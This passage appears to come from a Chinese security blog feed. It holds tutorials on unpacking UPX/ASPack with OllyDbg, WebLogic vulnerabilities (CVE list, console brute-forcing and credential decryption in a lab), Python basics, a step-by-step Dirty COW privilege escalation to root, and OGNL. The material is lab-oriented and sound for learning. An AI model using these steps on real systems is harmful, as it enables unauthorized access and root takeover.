<li><img src="/%E8%84%B1%E5%A3%B3/32.png" alt></li>
<li>或者在命令输入dd 0012FFA4（ESP数值）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/33.png" alt></li>
<li>数据窗口就跳转到ESP数值，然后同上</li>
<li>然后脱壳。</li>
</ol>
<h3 id="0x13-2次内存镜像法"><a href="#0x13-2次内存镜像法" class="headerlink" title="0x13 2次内存镜像法"></a>0x13 2次内存镜像法</h3><ol>
<li>重新运行程序ctrl+F2</li>
<li><img src="/%E8%84%B1%E5%A3%B3/34.png" alt></li>
<li>查看——内存（alt+m），或者点击m，进入内存映射</li>
<li><img src="/%E8%84%B1%E5%A3%B3/35.png" alt></li>
<li>找到目的程序的.rsrc——右击——在访问上设置中断F2——运行F9——再alt+m进入内存映射——点击UPX0——下断点F2——运行F9——来到不知什么位置——单步步过（其实很快到popad）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/36.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/37.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/38.png" alt></li>
</ol>
<h3 id="0x14-一步直达法"><a href="#0x14-一步直达法" class="headerlink" title="0x14 一步直达法"></a>0x14 一步直达法</h3><ol>
<li>aspack壳或upx壳部分能用</li>
<li>反汇编窗口——右击——查找——命令（ctrl+F）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/39.png" alt></li>
<li>输入popad，不勾选整个块</li>
<li><img src="/%E8%84%B1%E5%A3%B3/40.png" alt></li>
<li>这个程序就直接到popad</li>
<li>下面就是jmp到OEP</li>
<li><img src="/%E8%84%B1%E5%A3%B3/41.png" alt></li>
</ol>
<h2 id="0x20-ASPACK壳"><a href="#0x20-ASPACK壳" class="headerlink" title="0x20 ASPACK壳"></a>0x20 ASPACK壳</h2><ol>
<li>ASPACK：压缩壳</li>
</ol>
<h3 id="0x21-单步跟踪法"><a href="#0x21-单步跟踪法" class="headerlink" title="0x21 单步跟踪法"></a>0x21 单步跟踪法</h3><ol>
<li>查壳</li>
<li><img src="/%E8%84%B1%E5%A3%B3/42.png" alt></li>
<li>OD载入</li>
<li>单步步过F8，遇到call，再F8程序就自动运行了</li>
<li><img src="/%E8%84%B1%E5%A3%B3/43.png" alt></li>
<li>再来，到call时，单步步入F7，进入</li>
<li><img src="/%E8%84%B1%E5%A3%B3/44.png" alt></li>
<li>单步步过F8，又遇到call，再重来，单步步入F7</li>
<li><img src="/%E8%84%B1%E5%A3%B3/45.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/46.png" alt></li>
<li>单步步过F8，单步跟踪法</li>
<li>跳过向上跳转，右击——断点——运行到指定位置F4，…，直到popad</li>
<li><img src="/%E8%84%B1%E5%A3%B3/47.png" alt></li>
<li>这里有个retn，返回，继续F8</li>
<li><img src="/%E8%84%B1%E5%A3%B3/48.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/49.png" alt></li>
<li>这就是OEP</li>
</ol>
<h3 id="0x22-ESP定律法"><a href="#0x22-ESP定律法" class="headerlink" title="0x22 ESP定律法"></a>0x22 ESP定律法</h3><ol>
<li>OD载入，关注寄存器</li>
<li><img src="/%E8%84%B1%E5%A3%B3/50.png" alt></li>
<li>F8，关注寄存器，只有ESP是红色</li>
<li><img src="/%E8%84%B1%E5%A3%B3/51.png" alt></li>
<li>右击ESP的数值，数据窗口中跟随</li>
<li><img src="/%E8%84%B1%E5%A3%B3/52.png" alt></li>
<li>数据窗口的第一位地址就是ESP那个数值，右击数据窗口地址——断点——硬件访问——word或Dword</li>
<li><img src="/%E8%84%B1%E5%A3%B3/53.png" alt></li>
<li>运行F9，来到当前位置，其实popad就在上面</li>
<li><img src="/%E8%84%B1%E5%A3%B3/54.png" alt></li>
<li>F8，直到跳到OEP</li>
</ol>
<h3 id="0x23-一步直达法"><a href="#0x23-一步直达法" class="headerlink" title="0x23 一步直达法"></a>0x23 一步直达法</h3><ol>
<li>OD载入，右击反汇编窗口——查找——命令（快捷键ctrl+f）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/55.png" alt></li>
<li>搜索popad，不勾选整个块</li>
<li><img src="/%E8%84%B1%E5%A3%B3/56.png" alt></li>
<li>一个个查找，不是就查找下一个（快捷键ctrl+l），直到查找到目的popad</li>
<li><img src="/%E8%84%B1%E5%A3%B3/57.png" alt></li>
<li>右击——断点——运行到指定位置F4，F8，直到跳到OEP</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li>ximo早期发的脱壳基础</li>
<li><a href="https://www.52pojie.cn/" target="_blank" rel="noopener">https://www.52pojie.cn/</a></li>
</ol>
]]></content>
      <tags>
        <tag>MISC</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic序列漏洞</title>
    <url>/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</li>
</ol>
<h2 id="0x10-常见版本"><a href="#0x10-常见版本" class="headerlink" title="0x10 常见版本"></a>0x10 常见版本</h2><ol>
<li>Weblogic 10.3.6.0</li>
<li>Weblogic 12.1.3.0</li>
<li>Weblogic 12.2.1.1</li>
<li>Weblogic 12.2.1.2</li>
<li>Weblogic 12.2.1.3</li>
</ol>
<h2 id="0x20-历史漏洞"><a href="#0x20-历史漏洞" class="headerlink" title="0x20 历史漏洞"></a>0x20 历史漏洞</h2><ol>
<li><strong>控制台路径泄露</strong></li>
<li>Console</li>
<li></li>
<li><strong>SSRF</strong></li>
<li>CVE-2014-4210</li>
<li></li>
<li><strong>JAVA反序列化</strong></li>
<li>CVE-2015-4852  </li>
<li>CVE-2016-0638  </li>
<li>CVE-2016-3510   </li>
<li>CVE-2017-3248   </li>
<li>CVE-2018-2628 </li>
<li>CVE-2018-2893</li>
<li>CVE-2019-2725</li>
<li>CVE-2019-2729</li>
<li></li>
<li><strong>任意文件上传</strong></li>
<li>CVE-2018-2894</li>
<li></li>
<li><strong>XMLDecoder反序列化</strong> </li>
<li>CVE-2017-3506</li>
<li>CVE-2017-10271</li>
</ol>
<h2 id="0x30-控制台路径泄露"><a href="#0x30-控制台路径泄露" class="headerlink" title="0x30 控制台路径泄露"></a>0x30 控制台路径泄露</h2><ol>
<li>这本来不算漏洞，算漏洞也是个低危，但是，说到底这是登录控制台的，存在弱口令、被猜出账号密码或被爆破出账号密码就不是低危了。</li>
<li>环境：</li>
<li>weblogic 10.3.6(11g)</li>
<li>linux and docker</li>
<li>docker-compose up -d #docker搭建环境</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/1.png" alt></li>
<li>docker ps #查看正在运行的容器、IP、端口</li>
<li>访问 <a href="http://192.168.100.4:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.100.4:7001/console/login/LoginForm.jsp</a></li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/2.png" alt></li>
<li>抓取登录数据包</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/3.png" alt></li>
<li><a href="https://cirt.net/passwords?criteria=weblogic" target="_blank" rel="noopener">weblogic常见弱口令</a></li>
<li>Python脚本简单爆破账号密码，结果没成功~</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/4.png" alt></li>
<li>这里模拟存在弱口令的，进容器看看</li>
<li>docker ps</li>
<li>docker exec -it ID /bin/bash #进入容器</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/5.png" alt></li>
<li>找账号密码之路，在~/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security# cat boot.properties</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/6.png" alt></li>
<li>username={AES}xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</li>
<li>password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</li>
<li>解密，用环境中自带的weblogic_decrypt.jar解密，加密key是~/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</li>
<li>把SerializedSystemIni.dat从docker中复制到主机（kali，其实也是虚拟机，233）</li>
<li>docker cp 容器NAME:文件名路径 kali主机的路径  #从docker复制到主机</li>
<li>docker cp kali主机路径/文件 容器NAME:文件名路径 #从主机复制到docker</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/7.png" alt></li>
<li>启动解密工具：java -jar weblogic_decrypt.jar </li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/8.png" alt></li>
<li>不知为啥，等了很久，就是不显示解密密码，放弃</li>
<li>其他的解密方式<a href="https://www.freebuf.com/articles/web/220147.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/220147.html</a></li>
<li>访问 http:/127.0.0.1:7001/console/login/LoginForm.jsp 登录weblogic/Oracle@123，登录成功的</li>
<li>修改访问IP配置</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/9.png" alt></li>
<li>exit #退出容器</li>
<li>docker restart ID/NAME #重启容器</li>
<li>再Python脚本简单爆破账号密码，成功了（这里环境默认设置登录次数达到限制次数，就锁定帐号一段时间）</li>
<li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/10.png" alt></li>
<li>后台上传webshell-部署-安装-上传文件—getshell（忽略）</li>
</ol>
<h2 id="0x40-weblogic-SSRF"><a href="#0x40-weblogic-SSRF" class="headerlink" title="0x40 weblogic SSRF"></a>0x40 weblogic SSRF</h2><ol>
<li>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</li>
<li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</li>
<li></li>
<li>docker-compose build 或 docker-compose up -d #拉取环境</li>
<li>关键目录/uddiexplorer/，无需登录就可访问，<a href="http://IP:7001/uddiexplorer/" target="_blank" rel="noopener">http://IP:7001/uddiexplorer/</a></li>
</ol>
<h2 id="0x50"><a href="#0x50" class="headerlink" title="0x50"></a>0x50</h2><h2 id="0x"><a href="#0x" class="headerlink" title="0x"></a>0x</h2><h2 id="0x-1"><a href="#0x-1" class="headerlink" title="0x"></a>0x</h2><h2 id="0x-2"><a href="#0x-2" class="headerlink" title="0x"></a>0x</h2><h2 id="0xFF-参考链接、环境、验证工具"><a href="#0xFF-参考链接、环境、验证工具" class="headerlink" title="0xFF 参考链接、环境、验证工具"></a>0xFF 参考链接、环境、验证工具</h2><p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a><br><a href="https://vulhub.org/#/environments/" target="_blank" rel="noopener">https://vulhub.org/#/environments/</a></p>
]]></content>
      <tags>
        <tag>漏洞</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3基础</title>
    <url>/Python%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="0x00-基础语法"><a href="#0x00-基础语法" class="headerlink" title="0x00 基础语法"></a>0x00 基础语法</h2><p><strong>python文件编码</strong></p>
<ol>
<li>#coding:utf-8</li>
<li>#-*- coding:utf-8 -*- </li>
</ol>
<p><strong>标识符</strong></p>
<ol>
<li>第一个字符必须为字母或下划线_</li>
<li>其他的可以是字母、数字、下划线</li>
<li>大小写敏感</li>
</ol>
<p><strong>关键字</strong></p>
<ol>
<li>&gt;&gt;&gt;import keyword</li>
<li>&gt;&gt;&gt;keyword.kwlist</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/1.png" alt></li>
</ol>
<p><strong>注释</strong></p>
<ol>
<li>#   #单行注释</li>
<li>``` #多行注释</li>
<li>``` </li>
</ol>
<p><strong>多行语句</strong></p>
<ol>
<li>sum=a+\ </li>
<li>b+\</li>
<li>c      #sum=a+b+c</li>
</ol>
<p><strong>字符串</strong></p>
<ol>
<li>str=’字符串’</li>
<li>str=”字符串”</li>
<li>str=’’’字，</li>
<li>符，</li>
<li>串’’’</li>
<li>str=”””字符，</li>
<li>串”””</li>
<li><strong>字符串串联</strong></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/3.png" alt></li>
<li><strong>字符串截取</strong></li>
<li>str=’qwertyuiop’</li>
<li>print(str[首位:尾位:间隔])</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/4.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/6.png" alt></li>
</ol>
<p><strong>转义符</strong></p>
<ol>
<li>‘\‘  #\n</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/2.png" alt></li>
</ol>
<p><strong>等待用户输入</strong></p>
<ol>
<li>str=input(“输入：”)</li>
</ol>
<p><strong>一行显示多行</strong></p>
<ol>
<li><img src="/Python%E5%9F%BA%E7%A1%80/5.png" alt></li>
</ol>
<p><strong>不换行输出</strong></p>
<ol>
<li>print(‘a’,end=” “)</li>
<li>print(‘b’,end=” “)</li>
</ol>
<p><strong>帮助信息</strong></p>
<ol>
<li>python -h</li>
<li>python -c “import os;os.system(‘whoami’)”</li>
</ol>
<p><strong>列表、元组、集合、字典</strong></p>
<ol>
<li>列表list的元素写在方括号[]里；元组tuple的元素不能修改，写在小括号()里；集合set，在大括号{}或set()里；字典dictionary，用大括号{}标识，{‘key’:’value’}</li>
<li>a=[1,2,3,4,5]</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/7.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/8.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/25.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/26.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/27.png" alt></li>
</ol>
<p><strong>数据类型转换</strong></p>
<ol>
<li><img src="/Python%E5%9F%BA%E7%A1%80/9.png" alt></li>
</ol>
<p><strong>Python解析器</strong></p>
<ol>
<li>#!/usr/bin/env python3</li>
</ol>
<p><strong>运算符</strong></p>
<ol>
<li><p>Python算术运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/10.png" alt></p>
</li>
<li><p>Python比较运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/11.png" alt></p>
</li>
<li><p>Python赋值运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/12.png" alt></p>
</li>
<li><p>Python位运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/13.png" alt></p>
</li>
<li><p>Python逻辑运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/14.png" alt></p>
</li>
<li><p>Python运算符优先级</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/15.png" alt></p>
</li>
<li><p>数学函数</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/16.png" alt></p>
</li>
<li><p>随机数函数</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/17.png" alt></p>
</li>
<li><p>三角函数</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/18.png" alt></p>
</li>
<li><p>数学常量</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/19.png" alt></p>
</li>
<li><p>Python转义字符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/20.png" alt></p>
</li>
<li><p>Python字符串运算符</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/21.png" alt></p>
</li>
<li><p>python字符串格式化符号</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/22.png" alt></p>
</li>
<li><p>格式化操作符辅助指令</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/23.png" alt></p>
</li>
<li><p>Python 的字符串内建函数</p>
</li>
<li><p><img src="/Python%E5%9F%BA%E7%A1%80/24.png" alt></p>
</li>
</ol>
<h2 id="0x10-简单编程"><a href="#0x10-简单编程" class="headerlink" title="0x10 简单编程"></a>0x10 简单编程</h2><ol>
<li><strong>end关键字</strong></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/28.png" alt></li>
<li></li>
<li><strong>if嵌套</strong></li>
<li>if 表达式1:</li>
<li>语句</li>
<li>if 表达式2:</li>
<li>语句</li>
<li>elif 表达式3:</li>
<li>语句</li>
<li>else:</li>
<li>语句</li>
<li>elif 表达式4:</li>
<li>语句</li>
<li>else:</li>
<li>语句</li>
<li></li>
<li><strong>while循环</strong></li>
<li><strong>while 循环使用 else 语句</strong></li>
<li><strong>for语句</strong></li>
<li><strong>range()函数</strong></li>
<li>for i in range(5):</li>
<li>print(i) #0 1 2 3 4 5</li>
<li>for i in range(1,5):</li>
<li>print(i) #1 2 3 4</li>
<li></li>
<li><strong>break</strong></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/29.png" alt></li>
<li><strong>continue</strong></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/30.png" alt></li>
<li>pass</li>
</ol>
<p><strong>迭代器与生成器</strong></p>
<ol>
<li>iter() #创建迭代器对象</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/31.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/32.png" alt></li>
</ol>
<h2 id="0x11-函数-and-手册内置函数-and-python3内置函数"><a href="#0x11-函数-and-手册内置函数-and-python3内置函数" class="headerlink" title="0x11 函数 and 手册内置函数 and python3内置函数"></a>0x11 函数 and <a href="https://docs.python.org/zh-cn/3/library/functions.html" target="_blank" rel="noopener">手册内置函数</a> and <a href="https://www.runoob.com/python3/python3-built-in-functions.html" target="_blank" rel="noopener">python3内置函数</a></h2><ol>
<li><img src="/Python%E5%9F%BA%E7%A1%80/33.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/37.png" alt></li>
<li>abs(num) #返回num的绝对值</li>
<li>all() #所有元素为真则返回True</li>
<li>any() #任一元素为真则返回True</li>
<li>ascii()</li>
<li>bin() #其他进制转2进制</li>
<li>format() #格式化函数，format(23,’b’) 可返回二进制数</li>
<li>chr() #整型转ascii型</li>
<li>dir() #无实参，则返回本地作用域中的名称列表；有实参，则返回该对象的有效属性列表</li>
<li>divmod(a,b) #返回商和余数，即(a//b,a%b)</li>
<li>eval(表达式) #可解析表达式并求值，eval(‘1+2’)</li>
<li>exec() #支持动态执行Python代码</li>
<li>float() #返回浮点数</li>
<li>getattr() #获取对象的属性的值</li>
<li>globals() #返回当前全局符号表的字典</li>
<li>hash() #返回哈希值</li>
<li>help() #启动内置的帮助系统</li>
<li>hex() #其他进制转16进制</li>
<li>id() #返回对象的标识值</li>
<li>int() #字符串或数字转换为整型</li>
<li>input() #从输入中的读取一行</li>
<li>isinstance() #判断是否整型</li>
<li>iter() #生成迭代器</li>
<li>len() #返回对象的个数</li>
<li>list() #列表</li>
<li>locals() #字典类型返回当前位置的全部局部变量</li>
<li>map() #函数映射</li>
<li>max() #返回最大值</li>
<li>min() #返回最小值</li>
<li>next() #返回迭代器的下一个项目</li>
<li>oct() #其他进制转8进制</li>
<li>open() #打开某个文件，close() #关闭文件对象</li>
<li>ord() #字符转ascii码值</li>
<li>pow() #次方</li>
<li>print() #输出，默认以换行符\n结尾</li>
<li>range() #返回可迭代的对象</li>
<li>repr() #将对象转换为供解释器读取的形式</li>
<li>reversed() #返回一个反转的迭代器</li>
<li>round() #返回浮点数的四舍五入值</li>
<li>set() #创建无序、不重复元素集，删除重复数据</li>
<li>setattr() #设置属性值</li>
<li>sorted() #对所有可迭代的对象进行排序操作，默认升序</li>
<li>str() #将对象转换为字符型</li>
<li>sum() #求和</li>
<li>super() #用于调用父类的一个方法</li>
<li>tuple() #将可迭代对象序列为元组</li>
<li>type() #返回对象的类型</li>
<li>zip() #将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的对象</li>
<li>__import__() #用于动态加载类和函数<pre><code>import sys
__import__(&#39;base64&#39;) #导入base64.py模块</code></pre></li>
</ol>
<p><strong>数据结构</strong></p>
<ol>
<li><img src="/Python%E5%9F%BA%E7%A1%80/34.png" alt></li>
</ol>
<h2 id="0x20-模块"><a href="#0x20-模块" class="headerlink" title="0x20 模块"></a>0x20 模块</h2><p><strong>查看已安装模块</strong></p>
<ol>
<li>pip list #列出已安装模块</li>
<li>pip freeze #列出已安装模块</li>
</ol>
<p><strong>查看模块帮助信息</strong></p>
<ol>
<li>&gt;&gt;&gt; help(“modulename”) #查看模块帮助信息</li>
<li>pydoc modulename #查看模块帮助信息</li>
</ol>
<h3 id="0x21-导入模块或函数"><a href="#0x21-导入模块或函数" class="headerlink" title="0x21 导入模块或函数"></a>0x21 导入模块或函数</h3><ol>
<li>import module</li>
<li>from module import function</li>
<li>from module import function1,function2</li>
<li>from module import *</li>
<li></li>
<li>import sys</li>
<li>print(sys.path) </li>
<li></li>
<li>from sys import path</li>
<li>print(path)</li>
<li></li>
<li>#文件名：test.py</li>
<li>import sys</li>
<li>for i in sys.argv:</li>
<li>print(i)</li>
<li>#执行结果：</li>
<li>python test.py 参数1 参数2</li>
<li>test.py</li>
<li>参数1</li>
<li>参数2  </li>
<li><a href="https://www.runoob.com/python3/python3-module.html" target="_blank" rel="noopener">python3模块</a></li>
</ol>
<h2 id="0x23-常用模块"><a href="#0x23-常用模块" class="headerlink" title="0x23 常用模块"></a>0x23 常用模块</h2><ol>
<li><p>import os</p>
</li>
<li><p>os.getcwd() #获取当前目录</p>
</li>
<li><p>os.path #用于对系统路径文件的操作</p>
</li>
<li><p>import sys</p>
</li>
<li><p>sys.path #动态地改变Python解析器搜索路径</p>
</li>
</ol>
<h2 id="0x30-动态链接库"><a href="#0x30-动态链接库" class="headerlink" title="0x30 动态链接库"></a>0x30 动态链接库</h2><ol>
<li>dynamically linked library（被动态连接的库），一个二进制文件，不主动运行，由其他程序调用执行。</li>
<li>windows：dynamic link libraries（DLL）动态链接库</li>
<li>Linux：shared objects（SO）共享库</li>
<li>ctypes提供三种方法调用动态链接库：cdll()、windll()、oledll()</li>
</ol>
<h2 id="0x31-调用C库"><a href="#0x31-调用C库" class="headerlink" title="0x31 调用C库"></a>0x31 调用C库</h2><ol>
<li>C:\Windows\System32\msvcrt.dll</li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/35.png" alt></li>
<li><img src="/Python%E5%9F%BA%E7%A1%80/36.png" alt></li>
</ol>
<h2 id="0x-python与文件"><a href="#0x-python与文件" class="headerlink" title="0x python与文件"></a>0x python与文件</h2><ol>
<li>输出到文件<pre><code>#coding:utf-8
file=open(&quot;F:\\1.txt&quot;,&quot;w+&quot;)
for i in range(0,256):
 file.write(&quot;%&quot;+str(i)+&quot;\n&quot;)
file.close()</code></pre></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/python3/python3-tutorial.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>提权之Linux-dirtycow</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/</url>
    <content><![CDATA[<h2 id="0x00-dirtycow（脏牛）提权"><a href="#0x00-dirtycow（脏牛）提权" class="headerlink" title="0x00 dirtycow（脏牛）提权"></a>0x00 dirtycow（脏牛）提权</h2><ol>
<li>2007年发行至2016年10月18日修复</li>
<li>Linux kernel&gt;2.6.22</li>
<li>uname -r #查看内核版本</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/1.png" alt></li>
<li><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">EXP1</a></li>
<li>下载dirty.c到/tmp</li>
<li>useradd test #添加普通用户</li>
<li>useradd -s /bin/bash test #修改test的登录shell，默认是/bin/sh</li>
<li>su test #切换到用户test</li>
<li>gcc -pthread -lcrypt dirty.c -o dirty #编译dirty.c，生成执行文件dirty</li>
<li>id #查看用户权限</li>
<li>./dirty password #执行提权程序，密码设为password</li>
<li>要等~</li>
<li>su firefart #切换到程序预设的用户名，密码就是刚设的password</li>
<li>id #已经是root权限</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/2.png" alt></li>
</ol>
<h2 id="0x01-备忘"><a href="#0x01-备忘" class="headerlink" title="0x01 备忘"></a>0x01 备忘</h2><ol>
<li>记得恢复/etc/passwd</li>
<li>mv /tmp/passwd.bak /etc/passwd</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/3.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>OGNL表达式</title>
    <url>/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="0x00-OGNL"><a href="#0x00-OGNL" class="headerlink" title="0x00 OGNL"></a>0x00 OGNL</h2><ol>
<li>OGNL（Object Graph Navigation Language）即对象图形导航语言，是应用于Java中的一个开源的表达式语言（Expression Language，简称EL），它被集成在Struts2等框架中，作用是对数据进行访问，它拥有类型转换、访问对象方法、操作集合对象等功能。</li>
<li>对于用户输入的参数存取处理api都在ognl.java中，分别由getvalue和setvalue两个函数实现。</li>
</ol>
<h2 id="0x01-OGNL三要素"><a href="#0x01-OGNL三要素" class="headerlink" title="0x01 OGNL三要素"></a>0x01 OGNL三要素</h2><ol>
<li>Context对象：即OGNL的上下文环境，是OGNL的核心。</li>
<li>root对象：OGNL的操作对象，表达式规定做什么，root对象就指定对谁操作。</li>
<li>表达式（Expression）：OGNL表达式是功能强大的表达式语言，在OGNL中做任何操作（取值、赋值、调用方法等等），都要表达式表示。</li>
</ol>
<p><strong>User对象：User.java</strong></p>
<pre><code>public class User{
    private String name;
    private Integer age;
    public User(){
        super();
    }
}
public User(){
    super();
    this.name=name;
    this.age=age;
}
public String getName(){
    return name;
}
public void setName(String name){
    this.name=name;
}
public Integer getAge(){
    return age;
}
public void setAge(Integer age){
    this.age=age;
}
</code></pre><p><strong>User对象，root的方式</strong></p>
<pre><code>User rootUser=new User(&quot;test&quot;,11);</code></pre><p><strong>Context的方式</strong></p>
<pre><code>Map&lt;String,User&gt; context=new HashMap&lt;String,User&gt;();
context.put(&quot;user1&quot;,new User(&quot;aaa&quot;,22));
context.put(&quot;user2&quot;,new User(&quot;bbb&quot;,33));</code></pre><p><strong>创建OGNL Context对象</strong></p>
<pre><code>OgnlContext oc=new OgnlContext();
oc.setRoot(rootUser);
oc.setValues(context);</code></pre><p><strong>获取root中的User对象的name和age属性</strong></p>
<pre><code>String name=(String) Ognl.getValue(&quot;name&quot;,oc,oc.getRoot());
String age=(Integer) Ognl.getValue(&quot;age&quot;,oc,oc.getRoot());
System.out.println(name);
System.out.println(age);</code></pre><p><strong>获取Context对象中的属性值</strong>，要加上#符号</p>
<pre><code>String name1=(String) Ognl.getValue(&quot;#user1.name&quot;,oc,oc.getRoot());
String name2=(String) Ognl.getValue(&quot;#user2.name&quot;,oc,oc.getRoot());
Integer age1=(Integer) Ognl.getValue(&quot;#user1.age&quot;,oc,oc.getRoot());
Integer age2=(Integer) Ognl.getValue(&quot;#user2.age&quot;,oc,oc.getRoot());
System.out.println(name1);
System.out.println(name2);
System.out.println(age1);
System.out.println(age2);</code></pre><p><strong>为root中的user对象的name属性赋值</strong></p>
<pre><code>Ognl.getValue(&quot;name=&#39;ccc&#39;&quot;,oc,oc.getRoot());
String name=(String) Ognl.getValue(&quot;name&quot;,oc,oc.getRoot());
System.out.println(name);</code></pre><p><strong>为Context中的user1对象的name属性赋值</strong></p>
<pre><code>Ognl.getValue(&quot;#user1.name=&#39;ddd&#39;&quot;,oc,oc.getRoot());
String name1=(String) Ognl.getValue(&quot;#user1.name&quot;,oc,oc.getRoot());
System.out.println(name1);</code></pre><p><strong>getValue获取OGNL表达式运行后的值</strong></p>
<pre><code>public static java.lang.Object getValue(
java.lang.String expression, #表达式
java.util.Map context, #上下文
java.lang.Object root, #表达式根对象
java.lang.Class resultType) #被转换的结果对象的类型
throws OgnlException</code></pre><ol>
<li>OGNL 的 API 设计得是很简单的，context 提供上下文，为变量和表达式的求值过程来提供命名空间，存储变量 等，通过 root 来指定对象图遍历的初始变量，使用 expression 来告诉 Ognl 如何完成运算。</li>
</ol>
<h2 id="0x02-Struts标签"><a href="#0x02-Struts标签" class="headerlink" title="0x02 Struts标签"></a>0x02 Struts标签</h2><ol>
<li>&lt;%@taglib prefix=”s” uri=”/struts-tags” %&gt;</li>
<li>使用标签获取取值，取值的时候要注意根元素（全局变量）不用#号，其他的都用#号。</li>
</ol>
